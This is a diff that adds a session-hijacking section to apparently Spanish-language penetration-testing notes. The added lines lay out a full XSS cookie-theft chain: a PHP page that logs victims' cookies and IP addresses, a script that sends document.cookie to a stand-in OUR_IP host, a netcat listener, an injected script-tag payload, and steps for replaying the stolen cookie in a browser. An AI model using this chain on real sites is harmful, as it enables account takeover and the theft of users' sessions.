@@ -418,6 +418,34 @@ EXPLOTACION
                   
                       Probamos un script ej: <script>alert("HAS SIDO HACKEADO")</script>
 
+                  SESSION HIJACKING
+                  .................
+
+                     1 - Creamos un directorio temporal
+                           mkdir /tmp/tmpserver
+                           cd /tmp/tmpserver
+                     2 - Crea archivo index.php con el siguiente codigo:      
+                           <?php
+                           if (isset($_GET['c'])) {
+                               $list = explode(";", $_GET['c']);
+                               foreach ($list as $key => $value) {
+                                   $cookie = urldecode($value);
+                                   $file = fopen("cookies.txt", "a+");
+                                   fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+                                   fclose($file);
+                               }
+                           }
+                           ?>
+                     3 - Crea archivo script.js con el siguiente codigo
+                           new Image().src='http://OUR_IP:8080/index.php?c='+document.cookie
+                     4 - Pon tu maquina en escuchas
+                           nc -lnvp 8080
+                     5 - Prueba los campos con el payload
+                           "><script src=http://OUR_IP:8080/script.js></script>
+                     6 - Recibe el archivo cookie.txt con la coockie
+                     7 - Pon la cookie en tu navegador 
+                           Inspect > storage > pega cookie > refresca
+                                 
       BUSCAR EXPLOIT
       ..............
 
